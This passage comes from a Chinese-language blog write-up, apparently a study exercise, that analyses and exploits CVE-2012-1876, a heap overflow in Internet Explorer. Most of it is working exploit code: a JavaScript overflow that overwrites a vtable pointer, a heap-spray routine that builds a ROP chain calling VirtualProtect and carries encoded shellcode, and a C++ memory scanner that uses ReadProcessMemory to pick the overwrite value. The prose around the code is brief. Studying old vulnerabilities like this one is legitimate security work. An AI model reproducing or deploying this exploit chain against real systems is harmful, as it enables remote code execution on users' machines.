src="/2021/12/30/CVE-2012-1876%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B8%8E%E5%88%A9%E7%94%A8/image-20211216214440760.png" alt="image-20211216214440760"></p><p>这里进行覆盖的值&#x3D;width*125,后面调用的虚函数地址为[eax+dc],与漏洞战争书上略有不同.</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">second_overflow</span>(<span class="hljs-params"></span>) &#123;<br>           <span class="hljs-comment">//二次溢出,覆盖CBttonLayout虚表指针</span><br>           <span class="hljs-keyword">var</span> col = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-number">2</span>);<br>           col.<span class="hljs-property">width</span> = <span class="hljs-string">&quot;1003572&quot;</span>;<br>           col.<span class="hljs-property">span</span> = <span class="hljs-string">&quot;29&quot;</span>;<br>       &#125;<br></code></pre></td></tr></table></figure><p> 成功控制执行流程.</p><p> <img src="/2021/12/30/CVE-2012-1876%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B8%8E%E5%88%A9%E7%94%A8/image-20211230174540512.png" alt="image-20211230174540512"></p><p>下面进行heapspray,构造shellcode喷射到这个地址中.</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br></pre></td><td class="code"><pre><code class="hljs perl">function heapspray(base) &#123;<br>            <span class="hljs-regexp">//r</span>et<br>            var rop = (base + <span class="hljs-number">0x3142</span>).toString(<span class="hljs-number">16</span>);<br>            var rop_ret1 = rop.substring(<span class="hljs-number">4</span>, <span class="hljs-number">8</span>);<br>            var rop_ret2 = rop.substring(<span class="hljs-number">0</span>, <span class="hljs-number">4</span>);<br>            <span class="hljs-regexp">//p</span>op ebp;ret<br>            var rop = (base + <span class="hljs-number">0x4b015a</span>).toString(<span class="hljs-number">16</span>);<br>            var rop_popebp_ret1 = rop.substring(<span class="hljs-number">4</span>, <span class="hljs-number">8</span>);<br>            var rop_popebp_ret2 = rop.substring(<span class="hljs-number">0</span>, <span class="hljs-number">4</span>);<br>            <span class="hljs-regexp">//x</span>chg eax,esp;ret<br>            var rop = (base + <span class="hljs-number">0x701be</span>).toString(<span class="hljs-number">16</span>);<br>            var rop_xchg1 = rop.substring(<span class="hljs-number">4</span>, <span class="hljs-number">8</span>);<br>            var rop_xchg2 = rop.substring(<span class="hljs-number">0</span>, <span class="hljs-number">4</span>);<br>            <span class="hljs-regexp">//p</span>op ebx;ret<br>            var rop = (base + <span class="hljs-number">0x3d0537</span>).toString(<span class="hljs-number">16</span>);<br>            var rop_popebx_ret1 = rop.substring(<span class="hljs-number">4</span>, <span class="hljs-number">8</span>);<br>            var rop_popebx_ret2 = rop.substring(<span class="hljs-number">0</span>, <span class="hljs-number">4</span>);<br>            <span class="hljs-regexp">//p</span>op edx;ret<br>            var rop = (base + <span class="hljs-number">0x2fb796</span>).toString(<span class="hljs-number">16</span>);<br>            var rop_popedx_ret1 = rop.substring(<span class="hljs-number">4</span>, <span class="hljs-number">8</span>);<br>            var rop_popedx_ret2 = rop.substring(<span class="hljs-number">0</span>, <span class="hljs-number">4</span>);<br>            <span class="hljs-regexp">//p</span>op ecx;ret<br>            var rop = (base + <span class="hljs-number">0x17011a</span>).toString(<span class="hljs-number">16</span>);<br>            var rop_popecx_ret1 = rop.substring(<span class="hljs-number">4</span>, <span class="hljs-number">8</span>);<br>            var rop_popecx_ret2 = rop.substring(<span class="hljs-number">0</span>, <span class="hljs-number">4</span>);<br>            <span class="hljs-regexp">//</span>writable<br>            var rop = (base + <span class="hljs-number">0x100</span>).toString(<span class="hljs-number">16</span>);<br>            var writable1 = rop.substring(<span class="hljs-number">4</span>, <span class="hljs-number">8</span>);<br>            var writable2 = rop.substring(<span class="hljs-number">0</span>, <span class="hljs-number">4</span>);<br>            <span class="hljs-regexp">//p</span>op edi;ret<br>            var rop = (base + <span class="hljs-number">0x390a67</span>).toString(<span class="hljs-number">16</span>);<br>            var rop_popedi_ret1 = rop.substring(<span class="hljs-number">4</span>, <span class="hljs-number">8</span>);<br>            var rop_popedi_ret2 = rop.substring(<span class="hljs-number">0</span>, <span class="hljs-number">4</span>);<br>            <span class="hljs-regexp">//p</span>op esi;ret<br>            var rop = (base + <span class="hljs-number">0xf01bd</span>).toString(<span class="hljs-number">16</span>);<br>            var rop_popesi_ret1 = rop.substring(<span class="hljs-number">4</span>, <span class="hljs-number">8</span>);<br>            var rop_popesi_ret2 = rop.substring(<span class="hljs-number">0</span>, <span class="hljs-number">4</span>);<br>            <span class="hljs-regexp">//</span>jmp eax<br>            var rop = (base + <span class="hljs-number">0x1f2bd9</span>).toString(<span class="hljs-number">16</span>);<br>            var rop_jmpeax1 = rop.substring(<span class="hljs-number">4</span>, <span class="hljs-number">8</span>);<br>            var rop_jmpeax2 = rop.substring(<span class="hljs-number">0</span>, <span class="hljs-number">4</span>);<br>            <span class="hljs-regexp">//p</span>op eax;ret<br>            var rop = (base + <span class="hljs-number">0x351263</span>).toString(<span class="hljs-number">16</span>);<br>            var rop_popeax_ret1 = rop.substring(<span class="hljs-number">4</span>, <span class="hljs-number">8</span>);<br>            var rop_popeax_ret2 = rop.substring(<span class="hljs-number">0</span>, <span class="hljs-number">4</span>);<br>            <span class="hljs-regexp">//</span>VirtualProtect<br>            var rop = (base + <span class="hljs-number">0x1348</span>).toString(<span class="hljs-number">16</span>);<br>            var rop_vp1 = rop.substring(<span class="hljs-number">4</span>, <span class="hljs-number">8</span>);<br>            var rop_vp2 = rop.substring(<span class="hljs-number">0</span>, <span class="hljs-number">4</span>);<br>            <span class="hljs-regexp">//m</span>ov eax;dword ptr ds:[eax];ret<br>            var rop = (base + <span class="hljs-number">0x214bbd</span>).toString(<span class="hljs-number">16</span>);<br>            var rop_moveax_ret1 = rop.substring(<span class="hljs-number">4</span>, <span class="hljs-number">8</span>);<br>            var rop_moveax_ret2 = rop.substring(<span class="hljs-number">0</span>, <span class="hljs-number">4</span>);<br>            <span class="hljs-regexp">//pus</span>had;ret<br>            var rop = (base + <span class="hljs-number">0x51a2c8</span>).toString(<span class="hljs-number">16</span>);<br>            var rop_pushad_ret1 = rop.substring(<span class="hljs-number">4</span>, <span class="hljs-number">8</span>);<br>            var rop_pushad_ret2 = rop.substring(<span class="hljs-number">0</span>, <span class="hljs-number">4</span>);<br>            <span class="hljs-regexp">//pus</span>h esp;ret<br>            var rop = (base + <span class="hljs-number">0x49cb1d</span>).toString(<span class="hljs-number">16</span>);<br>            var rop_pushesp_ret1 = rop.substring(<span class="hljs-number">4</span>, <span class="hljs-number">8</span>);<br>            var rop_pushesp_ret2 = rop.substring(<span class="hljs-number">0</span>, <span class="hljs-number">4</span>);<br><br>            var shellcode = unescape(<span class="hljs-string">&quot;%u&quot;</span> + rop_ret1 + <span class="hljs-string">&quot;%u&quot;</span> + rop_ret2);                 <span class="hljs-regexp">//r</span>et<br>            shellcode += unescape(<span class="hljs-string">&quot;%u&quot;</span> + rop_popebp_ret1 + <span class="hljs-string">&quot;%u&quot;</span> + rop_popebp_ret2);      <span class="hljs-regexp">//p</span>op ebp;ret<br>            <span class="hljs-keyword">for</span> (var i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">0x32</span>; i++) &#123;<br>                shellcode += unescape(<span class="hljs-string">&quot;%u&quot;</span> + rop_ret1 + <span class="hljs-string">&quot;%u&quot;</span> + rop_ret2);                <span class="hljs-regexp">//r</span>et<br>            &#125;<br>            shellcode += unescape(<span class="hljs-string">&quot;%u&quot;</span> + rop_popebp_ret1 + <span class="hljs-string">&quot;%u&quot;</span> + rop_popebp_ret2);      <span class="hljs-regexp">//p</span>op ebp;ret       ebp=shellcode_addr<br>            shellcode += unescape(<span class="hljs-string">&quot;%u2a80%u077a&quot;</span>);<br>            shellcode += unescape(<span class="hljs-string">&quot;%u&quot;</span> + rop_popedx_ret1 + <span class="hljs-string">&quot;%u&quot;</span> + rop_popedx_ret2);                    <br>            shellcode += unescape(<span class="hljs-string">&quot;%u&quot;</span> + rop_xchg1 + <span class="hljs-string">&quot;%u&quot;</span> + rop_xchg2);                  <span class="hljs-regexp">//x</span>chg eax,esp;ret; start change stack<br>            shellcode += unescape(<span class="hljs-string">&quot;%u&quot;</span> + rop_popebx_ret1 + <span class="hljs-string">&quot;%u&quot;</span> + rop_popebx_ret2);      <span class="hljs-regexp">//p</span>op ebx;ret       ebx=<span class="hljs-number">1024</span><br>            shellcode += unescape(<span class="hljs-string">&quot;%u1024%u0000&quot;</span>);                                       <span class="hljs-regexp">//</span><span class="hljs-number">1024</span>             <br>            shellcode += unescape(<span class="hljs-string">&quot;%u&quot;</span> + rop_popedx_ret1 + <span class="hljs-string">&quot;%u&quot;</span> + rop_popedx_ret2);      <span class="hljs-regexp">//p</span>op edx;ret       edx=<span class="hljs-number">40</span><br>            shellcode += unescape(<span class="hljs-string">&quot;%u0040%u0000&quot;</span>);                                       <span class="hljs-regexp">//</span><span class="hljs-number">40</span><br>            shellcode += unescape(<span class="hljs-string">&quot;%u&quot;</span> + rop_popecx_ret1 + <span class="hljs-string">&quot;%u&quot;</span> + rop_popecx_ret2);      <span class="hljs-regexp">//p</span>op ecx;ret       <br>            shellcode += unescape(<span class="hljs-string">&quot;%u2a70%u077a&quot;</span>);                                      <br>            shellcode += unescape(<span class="hljs-string">&quot;%u&quot;</span> + rop_popedi_ret1 + <span class="hljs-string">&quot;%u&quot;</span> + rop_popedi_ret2);      <span class="hljs-regexp">//p</span>op edi;ret       <br>            shellcode += unescape(<span class="hljs-string">&quot;%u&quot;</span> + rop_ret1 + <span class="hljs-string">&quot;%u&quot;</span> + rop_ret2);                    <span class="hljs-regexp">//r</span>et<br>            shellcode += unescape(<span class="hljs-string">&quot;%u&quot;</span> + rop_popesi_ret1 + <span class="hljs-string">&quot;%u&quot;</span> + rop_popesi_ret2);      <span class="hljs-regexp">//p</span>op esi;ret        <br>            shellcode += unescape(<span class="hljs-string">&quot;%u&quot;</span> + rop_jmpeax1 + <span class="hljs-string">&quot;%u&quot;</span> + rop_jmpeax2);              <span class="hljs-regexp">//</span>jmp eax<br>            shellcode += unescape(<span class="hljs-string">&quot;%u&quot;</span> + rop_popeax_ret1 + <span class="hljs-string">&quot;%u&quot;</span> + rop_popeax_ret2);      <span class="hljs-regexp">//p</span>op eax;ret<br>            shellcode += unescape(<span class="hljs-string">&quot;%u&quot;</span> + rop_vp1 + <span class="hljs-string">&quot;%u&quot;</span> + rop_vp2);                      <span class="hljs-regexp">//</span>VirtualProtect_addr eax=VirtualProtect<br>            shellcode += unescape(<span class="hljs-string">&quot;%u&quot;</span> + rop_moveax_ret1 + <span class="hljs-string">&quot;%u&quot;</span> + rop_moveax_ret2);      <span class="hljs-regexp">//m</span>ov eax;[eax];ret<br>            shellcode += unescape(<span class="hljs-string">&quot;%u&quot;</span> + rop_pushad_ret1 + <span class="hljs-string">&quot;%u&quot;</span> + rop_pushad_ret2);      <span class="hljs-regexp">//pus</span>had;ret<br>            shellcode += unescape(<span class="hljs-string">&quot;%u&quot;</span> + rop_pushesp_ret1 + <span class="hljs-string">&quot;%u&quot;</span> + rop_pushesp_ret2);    <span class="hljs-regexp">//pus</span>h esp;ret;<br>            shellcode += unescape(<span class="hljs-string">&quot;%u9090%u9090&quot;</span>);<br>            shellcode += unescape(<span class="hljs-string">&quot;%u9090%u9090&quot;</span>);<br>            shellcode += unescape(<br>                <span class="hljs-string">&quot;%u68FC%u0A6A%u1E38%u6368%uD189%u684F%u7432%u0C91%uF48B%u7E8D%u33F4%uB7DB%u2B04%u66E3%u33BB&quot;</span> +<br>                <span class="hljs-string">&quot;%u5332%u7568%u6573%u5472%uD233%u8B64%u305A%u4B8B%u8B0C%u1C49%u098B%u098B%u698B%uAD08%u6A3D&quot;</span> +<br>                <span class="hljs-string">&quot;%u380A%u751E%u9505%u57FF%u95F8%u8B60%u3C45%u4C8B%u7805%uCD03%u598B%u0320%u33DD%u47FF%u348B&quot;</span> +<br>                <span class="hljs-string">&quot;%u03BB%u99F5%uBE0F%u3A06%u74C4%uC108%u07CA%uD003%uEB46%u3BF1%u2454%u751C%u8BE4%u2459%uDD03&quot;</span> +<br>                <span class="hljs-string">&quot;%u8B66%u7B3C%u598B%u031C%u03DD%uBB2C%u5F95%u57AB%u3D61%u0A6A%u1E38%uA975%uDB33%u6853%u6465&quot;</span> +<br>                <span class="hljs-string">&quot;%u0000%u6868%u6361%u8B6B%u53C4%u5050%uFF53%uFC57%uFF53%uF857%9090%9090%9090&quot;</span>);<br>            <span class="hljs-keyword">while</span> (shellcode.length &lt; <span class="hljs-number">100000</span>) &#123;<br>                shellcode += shellcode;<br>            &#125;<br>            //<span class="hljs-number">64</span>k<br>            var onemeg = shellcode.substr(<span class="hljs-number">0</span>, <span class="hljs-number">64</span> * <span class="hljs-number">1024</span> / <span class="hljs-number">2</span>);<br>            <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">14</span>; i++) &#123;<br>                onemeg += shellcode.substr(<span class="hljs-number">0</span>, <span class="hljs-number">64</span> * <span class="hljs-number">1024</span> / <span class="hljs-number">2</span>);<br>            &#125;<br>            var spray = new Array();<br>            <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">1000</span>; i++) &#123;<br>                spray[i] = onemeg.substr(<span class="hljs-number">0</span>, onemeg.length);<br>            &#125;<br>        &#125;<br></code></pre></td></tr></table></figure><p>为了使覆盖的虚表指针的值刚好是shellcode起始位置,并且eax+dc位置是xchg eax,esp ret指令地址,可以通过读取内存快速查找对应地址,写入第二次溢出的width中</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;windows.h&gt;</span></span><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>HANDLE processHandle = <span class="hljs-built_in">OpenProcess</span>(PROCESS_ALL_ACCESS, <span class="hljs-number">0</span>, <span class="hljs-number">3920</span>);<br><span class="hljs-type">int</span> addr = <span class="hljs-number">1000000</span>;<br>DWORD temp = <span class="hljs-number">0</span>;<br><span class="hljs-keyword">while</span> (<span class="hljs-number">1</span>) &#123;<br>DWORD val = <span class="hljs-number">0</span>;<br><span class="hljs-type">int</span> ret = <span class="hljs-built_in">ReadProcessMemory</span>(processHandle, (LPVOID)(addr * <span class="hljs-number">125</span>), &amp;val, <span class="hljs-number">4</span>, &amp;temp);<br><span class="hljs-keyword">if</span> (ret) &#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;addr:%08x:%08x\n&quot;</span>, addr * <span class="hljs-number">125</span>);<br>&#125;<br><span class="hljs-keyword">if</span> (ret &amp;&amp; val == <span class="hljs-number">0x6ABD3142</span>) &#123;<br>ret = <span class="hljs-built_in">ReadProcessMemory</span>(processHandle, (LPVOID)(addr * <span class="hljs-number">125</span> + <span class="hljs-number">0xdc</span>), &amp;val, <span class="hljs-number">4</span>, &amp;temp);<br><span class="hljs-keyword">if</span> (val == <span class="hljs-number">0x6AC401BE</span>) &#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;result=%d\n&quot;</span>, addr);<br><span class="hljs-keyword">break</span>;<br>&#125;<br>&#125;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%x\n&quot;</span>, addr);<br>addr++;<br>&#125;<br><span class="hljs-built_in">system</span>(<span class="hljs-string">&quot;pause&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>结果</p><p><img src="/2021/12/30/CVE-2012-1876%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B8%8E%E5%88%A9%E7%94%A8/GIF.gif" alt="GIF"></p><h4 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h4><p>漏洞战争:软件漏洞分析精要</p>]]></content>
    
    
    
  </entry>
  
  
  
  
</search>
